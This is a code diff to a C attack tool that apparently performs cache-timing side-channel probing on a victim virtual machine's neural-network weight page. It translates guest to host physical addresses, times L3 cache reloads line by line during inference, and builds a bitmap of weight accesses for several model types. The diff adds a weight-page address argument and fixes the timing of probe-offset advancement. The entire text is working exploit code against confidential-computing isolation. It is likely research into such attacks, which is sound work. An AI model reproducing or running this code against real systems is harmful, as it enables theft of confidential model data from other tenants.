@@ -79,6 +79,8 @@ static int     current_offset  = 0;              // 0..63, which 64B line we pro
 static uint8_t bitmap[16][LINES_PER_PAGE];       // [layer][offset] -> 0/1/0xff
 static unsigned long last_weight_hpa = 0;        // HPA of victim weight page
 
+static unsigned long weight_page_gpa = 0;  // GPA of victim weight page passed via argv
+
 // ---------------------------------------------------------------------------
 // Low-level helpers
 // ---------------------------------------------------------------------------
@@ -487,25 +489,37 @@ int main(int argc, char *argv[]) {
     unsigned long tdr_pa;
     int util_fd, status;
 
-    if (argc < 3) {
+    if (argc < 4) {
         fprintf(stderr,
-            "Usage: %s <model> <GPA1> <GPA2> ...\n"
-            "Models: mlp, cnn, resnet, transformer\n",
+            "Usage: %s <model> <weight_GPA> <marker_GPA1> <marker_GPA2> ...\n"
+            "Models: mlp, cnn, resnet, transformer\n"
+            "weight_GPA: GPA of the victim weight matrix page to probe\n",
             argv[0]);
         exit(EXIT_SUCCESS);
     }
 
     const char *model    = argv[1];
-    int         num_gpas = argc - 2;
 
+    // argv[2] = weight page GPA to probe for Gen 2
+    // argv[3..] = marker GPAs for page fault synchronization
+    char *endptr = NULL;
+    weight_page_gpa = strtoul(argv[2], &endptr, 0);
+    if (*endptr != '\0') {
+        fprintf(stderr, "Could not parse weight GPA '%s'\n", argv[2]);
+        exit(EXIT_FAILURE);
+    }
+    printf(CYEL "[gen2] probing weight page GPA 0x%lx\n" CRESET,
+           weight_page_gpa);
+
+    int num_gpas = argc - 3;
     unsigned long *gpa = malloc(num_gpas * sizeof(unsigned long));
     if (!gpa) { perror("malloc"); exit(EXIT_FAILURE); }
 
     for (int i = 0; i < num_gpas; i++) {
-        char *endptr = NULL;
-        gpa[i] = strtoul(argv[i + 2], &endptr, 0);
+        endptr = NULL;
+        gpa[i] = strtoul(argv[i + 3], &endptr, 0);
         if (*endptr != '\0') {
-            fprintf(stderr, "Could not parse GPA '%s'\n", argv[i + 2]);
+            fprintf(stderr, "Could not parse GPA '%s'\n", argv[i + 3]);
             free(gpa);
             exit(EXIT_FAILURE);
         }
@@ -577,7 +591,7 @@ int main(int argc, char *argv[]) {
             // probe buffer line that maps to the same L3 cache set.
             // All done in userspace — no kernel changes needed.
             last_weight_hpa = get_hpa_from_gpa(util_fd,
-                                               address_accessed, tdr_pa);
+                                               weight_page_gpa, tdr_pa);
             if (last_weight_hpa) {
                 unsigned long target_hpa = last_weight_hpa
                                          + (current_offset * CACHE_LINE);
@@ -632,15 +646,20 @@ int main(int argc, char *argv[]) {
                            layer_idx, current_offset,
                            (unsigned long)reload_delta, bit);
 
-                    // Advance to next cache line offset.
-                    // One offset is probed per full inference cycle.
-                    // After 64 inferences the full page bitmap is complete.
-                    current_offset = (current_offset + 1) % LINES_PER_PAGE;
-                    if (current_offset == 0) {
-                        print_bitmap();
-                        printf(CYEL
-                               "[gen2] Full page scanned (%d inferences)."
-                               " Restarting.\n" CRESET, LINES_PER_PAGE);
+                    // Only advance offset on the LAST layer's END marker
+                    // so we probe one offset per complete inference run.
+                    // For MLP: L3_END is idx=6. For CNN: FC1_END is idx=6.
+                    // For ResNet/Transformer: CLASSIFIER_END is idx=6 or 8.
+                    // We advance when we see the last END before TERM.
+                    int last_end = (strcmp(model, "transformer") == 0) ? 8 : 6;
+                    if (idx == last_end) {
+                        current_offset = (current_offset + 1) % LINES_PER_PAGE;
+                        if (current_offset == 0) {
+                            print_bitmap();
+                            printf(CYEL
+                                   "[gen2] Full page scanned (%d inferences)."
+                                   " Restarting.\n" CRESET, LINES_PER_PAGE);
+                        }
                     }
                 }
             }
